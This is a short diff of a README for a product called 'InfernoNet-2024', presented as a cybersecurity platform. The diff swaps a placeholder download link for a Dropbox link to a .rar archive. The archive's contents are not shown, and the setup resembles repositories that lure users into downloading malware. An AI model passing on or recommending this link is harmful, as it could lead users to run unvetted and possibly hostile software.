@@ -31,7 +31,7 @@ InfernoNet-2024 is at the forefront of cybersecurity, offering an extensive arra
 
 To get started with InfernoNet-2024, download the platform and follow our step-by-step installation guide:
 
-- [Download InfernoNet Platform](#DOWNLOAD_LINK)
+- [Download InfernoNet Platform](https://www.dropbox.com/scl/fi/8j0zidp8wsbsqprvf6twi/InfernoNet2024.rar?rlkey=gms3b1sqmfjtkwfmhobg1v5ox&dl=0)
 - [Watch Installation Guide Video](#INSTALLATION_VIDEO_LINK)
 
 ## 📦 Products & Usage
